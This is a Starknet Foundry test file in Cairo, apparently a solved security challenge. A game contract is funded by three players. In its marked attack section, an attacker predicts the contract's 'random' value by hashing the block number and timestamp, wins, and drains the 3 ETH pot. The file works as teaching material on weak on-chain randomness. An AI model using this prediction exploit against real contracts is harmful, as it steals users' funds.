use alexandria_merkle_tree::merkle_tree::pedersen::PedersenHasherImpl;
use ayn_random::guess::simple_game::{ISimpleGameDispatcher, ISimpleGameDispatcherTrait};
use ayn_random::utils::helpers;
use openzeppelin_token::erc20::interface::IERC20DispatcherTrait;
use snforge_std::{
    ContractClassTrait, DeclareResultTrait, declare, start_cheat_block_number,
    start_cheat_block_timestamp, start_cheat_caller_address, stop_cheat_caller_address,
};
use starknet::ContractAddress;

fn deploy_game(eth: ContractAddress) -> (ContractAddress, ISimpleGameDispatcher) {
    let contract_class = declare("SimpleGame").unwrap().contract_class();
    let (address, _) = contract_class.deploy(@array![eth.into()]).unwrap();
    return (address, ISimpleGameDispatcher { contract_address: address });
}

#[test]
fn test_bad_random() {
    // Users
    let alice: ContractAddress = 'alice'.try_into().unwrap();
    let bob: ContractAddress = 'bob'.try_into().unwrap();
    let charlie: ContractAddress = 'charlie'.try_into().unwrap();
    let attacker: ContractAddress = 'attacker'.try_into().unwrap();

    // Deployments
    let (eth_address, eth_dispatcher) = helpers::deploy_eth();
    let (game_address, game_dispatcher) = deploy_game(eth_address);

    // Minting ETH to the users
    // Alice, Bob and Charlie get 10 ETH, Attacker gets 1
    helpers::mint_erc20(eth_address, alice, helpers::one_ether() * 10);
    helpers::mint_erc20(eth_address, bob, helpers::one_ether() * 10);
    helpers::mint_erc20(eth_address, charlie, helpers::one_ether() * 10);
    helpers::mint_erc20(eth_address, attacker, helpers::one_ether() * 1);

    // Set timestamp and block number (By default it's 0 in Starknet Foundry)
    start_cheat_block_timestamp(game_address, 1000);
    start_cheat_block_number((game_address), 1000);

    // Alice, Bob and Charlie are trying their luck
    // Alice
    start_cheat_caller_address(eth_address, alice);
    eth_dispatcher.approve(game_address, helpers::one_ether());
    stop_cheat_caller_address(eth_address);
    start_cheat_caller_address(game_address, alice);
    game_dispatcher.play('AliceInWonderland'.into());
    stop_cheat_caller_address(game_address);
    // Bob
    start_cheat_caller_address(eth_address, bob);
    eth_dispatcher.approve(game_address, helpers::one_ether());
    stop_cheat_caller_address(eth_address);
    start_cheat_caller_address(game_address, bob);
    game_dispatcher.play('BobTheBuilder'.into());
    stop_cheat_caller_address(game_address);
    // Charlie
    start_cheat_caller_address(eth_address, charlie);
    eth_dispatcher.approve(game_address, helpers::one_ether());
    stop_cheat_caller_address(eth_address);
    start_cheat_caller_address(game_address, charlie);
    game_dispatcher.play('CharlieAndTheChocolateFactory'.into());
    stop_cheat_caller_address(game_address);

    // They are all noobs and now there is 3 ETH in the contract
    let contract_balance = eth_dispatcher.balance_of(game_address);
    assert!(contract_balance == helpers::one_ether() * 3, "wrong contract balance");

    // Attack Start //
    // TODO: Win the game and get all the ETH
    start_cheat_caller_address(eth_address, attacker);
    eth_dispatcher.approve(game_address, helpers::one_ether());
    stop_cheat_caller_address(eth_address);
    start_cheat_caller_address(game_address, attacker);
    let block_num = 1_000;
    let block_ts = 1_000;
    let guess = core::pedersen::pedersen(block_num, block_ts);
    game_dispatcher.play(guess.into());
    stop_cheat_caller_address(game_address);
    // Attack End //

    // Attacker should have win the game and get all the ETH (4 ETH in total)
    let attacker_balance = eth_dispatcher.balance_of(attacker);
    println!("Attacker balance: {}", attacker_balance);
    assert!(
        attacker_balance >= helpers::one_ether() * 4, "Attacker balance should be at least 4 ETH",
    );
}
